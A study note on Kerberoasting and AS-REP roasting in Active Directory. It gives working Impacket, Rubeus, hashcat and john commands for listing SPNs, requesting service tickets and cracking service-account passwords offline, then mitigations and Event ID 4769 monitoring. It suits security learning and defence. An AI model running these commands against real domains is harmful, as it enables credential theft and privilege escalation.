# Kerberoasting

Kerberoasting lets an authenticated domain user request service tickets for SPNs and crack them offline to recover plaintext passwords.

## How it works

1. Any domain user can request a TGS for services registered with an SPN
2. The TGS is encrypted with the service account's password hash
3. Attacker exports tickets and cracks them offline (Hashcat mode 13100)
4. Compromised service accounts often have elevated privileges

## Why it works

Service accounts (SQL, IIS, etc.) are registered with a **Service Principal Name (SPN)**. Any authenticated user can ask the DC for a TGS ticket for that SPN, and the DC hands it back **encrypted with the service account's password hash** - no authorization check on whether you can actually use the service. Crack that ticket offline and you have the service account's plaintext password. These accounts are frequently over-privileged.

## Step 1 - Find kerberoastable accounts

```bash
# Impacket - list SPNs (no ticket yet)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10

# PowerView (on a domain host)
Get-DomainUser -SPN | select samaccountname
```

## Step 2 - Request and export tickets

```bash
# Impacket - request all and save hashes
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Target a single SPN (stealthier)
Rubeus.exe kerberoast /user:sqlsvc /outfile:hash.txt
```

## Step 3 - Crack offline

```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

Mode `13100` = Kerberos 5 TGS-REP (RC4). If accounts use AES, it's `19600`/`19700` and much slower.

## Related: AS-REP Roasting

Same idea, different pre-condition. Accounts with **"Do not require Kerberos pre-authentication"** let you request an AS-REP encrypted with their hash **without any credentials**:

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
hashcat -m 18200 asrep.txt rockyou.txt
```

## Mitigation - the fix

- Use **gMSAs** (managed service accounts) or long random passwords (25+ chars) - uncrackable.
- Enforce **AES** encryption for Kerberos (disable RC4).
- Least privilege - service accounts should never be Domain Admins.
- Monitor **Event ID 4769** for many/unusual TGS requests (RC4 requests are a red flag).

## Practice

- TryHackMe Attacktive Directory; HTB boxes tagged "Kerberos"

## Related

- [Active Directory Basics](Active%20Directory%20Basics.md)
